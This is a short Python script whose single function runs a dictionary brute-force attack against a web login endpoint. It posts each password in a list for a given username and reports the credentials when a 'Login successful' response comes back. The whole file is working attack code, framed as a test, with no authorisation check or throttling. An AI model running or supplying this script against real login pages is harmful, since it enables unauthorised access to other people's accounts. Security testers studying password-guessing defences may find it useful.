import requests

def brute_force_test(base_url, options):
    """
    Perform a brute force attack on the given URL using the specified options.

    Parameters:
    - base_url (str): The target URL.
    - options (dict): Contains required parameters for the attack, e.g.,
                      {
                          "username": "admin",
                          "password_list": ["password1", "password2", "password123"],
                          "login_endpoint": "/login"
                      }

    Returns:
    dict: Results of the brute force attempt.
    """
    # Extract options
    username = options.get("username")
    password_list = options.get("password_list", [])
    login_endpoint = options.get("login_endpoint", "/login")
    timeout = options.get("timeout", 5)

    if not username or not password_list:
        return {"error": "Username and password list are required"}

    url = f"{base_url.rstrip('/')}{login_endpoint}"
    results = {"attempted": 0, "success": False, "details": None}

    # Perform brute force attack
    for password in password_list:
        try:
            response = requests.post(
                url,
                json={"username": username, "password": password},
                timeout=timeout
            )
            results["attempted"] += 1

            # Assuming a 200 OK with a specific message indicates success
            if response.status_code == 200 and "Login successful" in response.text:
                results["success"] = True
                results["details"] = {
                    "username": username,
                    "password": password,
                    "response": response.text
                }
                break
        except requests.RequestException as e:
            results["details"] = {"error": str(e)}
            break

    if not results["success"]:
        results["details"] = "Brute force attack failed. No matching credentials found."

    return results
